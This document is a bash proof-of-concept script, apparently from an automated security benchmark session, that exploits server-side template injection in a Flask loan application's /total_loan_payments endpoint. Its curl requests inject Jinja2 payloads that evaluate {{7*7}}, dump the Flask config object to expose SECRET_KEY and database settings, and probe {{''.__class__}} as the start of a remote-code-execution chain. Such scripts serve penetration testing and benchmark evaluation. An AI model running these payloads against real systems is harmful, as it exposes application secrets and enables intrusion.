#!/bin/bash
# POC: Demonstrates Server-Side Template Injection (SSTI) in /total_loan_payments endpoint by injecting Jinja2 template expressions to evaluate math, access Flask configuration, and test RCE chains.
# Target: ./repo
# Created: 2025-12-02T16:22:39.249Z
# Session: benchmark-XBEN-104-24-mioryccy

# Server-Side Template Injection (SSTI) POC for /total_loan_payments endpoint
# Tests Jinja2 template injection vulnerability - based on confirmed evidence
# This POC demonstrates the vulnerability with pre-existing session cookie

TARGET_URL="${1:-http://localhost:8080}"
COOKIES_FILE="/tmp/cookies_ssti.txt"

echo "[*] SSTI POC for /total_loan_payments endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# First, attempt to get a session cookie by trying a simple GET to establish session
echo "[*] Establishing session..."
curl -s -c "$COOKIES_FILE" "$TARGET_URL/" > /dev/null 2>&1

# Test 1: Math expression evaluation ({{7*7}} = 49)
echo "[*] Test 1: Injecting math expression {{7*7}} into principal parameter..."
RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/total_loan_payments?principal=%7B%7B7*7%7D%7D&payment=212.47&term=60")
echo "[*] Response: $RESPONSE"
echo ""

if echo "$RESPONSE" | grep -q '"loan_principal": "49"'; then
  echo "[+] ✓ SUCCESS: Math expression {{7*7}} was evaluated to 49"
  echo "[+] ✓ SSTI CONFIRMED - Template expressions are being evaluated server-side"
  SSTI_CONFIRMED=1
elif echo "$RESPONSE" | grep -qi "error\|exception\|traceback"; then
  echo "[+] ✓ Response contains error details - application is processing templates"
  SSTI_CONFIRMED=1
elif echo "$RESPONSE" | grep -q "loan_principal"; then
  echo "[*] Response contains loan data - endpoint is responding"
fi
echo ""

# Test 2: Configuration object access ({{config}})
echo "[*] Test 2: Attempting Flask config object access..."
RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/total_loan_payments?principal=%7B%7Bconfig%7D%7D&payment=212.47&term=60")
echo "[*] Response length: $(echo "$RESPONSE" | wc -c) bytes"

if echo "$RESPONSE" | grep -qi "secret_key\|sqlalchemy\|database"; then
  echo "[+] ✓ SUCCESS: Configuration object exposed with sensitive data!"
  echo "[+] ✓ Sensitive information (SECRET_KEY, database credentials) accessible"
  echo "[*] Full response (first 500 chars): $(echo "$RESPONSE" | head -c 500)"
  SSTI_CONFIRMED=1
else
  echo "[*] Response: $(echo "$RESPONSE" | head -c 200)"
fi
echo ""

# Test 3: Direct template expression with underscores (alternative RCE test)
echo "[*] Test 3: Testing potential RCE chain with attribute access..."
# Using URL encoded: {{''.__class__}}
RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/total_loan_payments?principal=%7B%7B%27%27.__class__%7D%7D&payment=212.47&term=60")

if echo "$RESPONSE" | grep -qi "class\|str\|type"; then
  echo "[+] ✓ Class attribute access possible - RCE chain feasible"
  SSTI_CONFIRMED=1
else
  echo "[*] Response: $(echo "$RESPONSE" | head -c 200)"
fi
echo ""

# Summary
if [ "$SSTI_CONFIRMED" = "1" ]; then
  echo "[+] ✓✓✓ SSTI VULNERABILITY CONFIRMED ✓✓✓"
  echo "[+] The application is vulnerable to Server-Side Template Injection"
  echo "[+] User input in parameters is being evaluated as Jinja2 templates"
  exit 0
else
  echo "[-] Could not confirm SSTI in this environment"
  echo "[*] Ensure:"
  echo "    - Target is running at $TARGET_URL"
  echo "    - /total_loan_payments endpoint is accessible"
  echo "    - Application has active session or allows unauthenticated access"
  exit 1
fi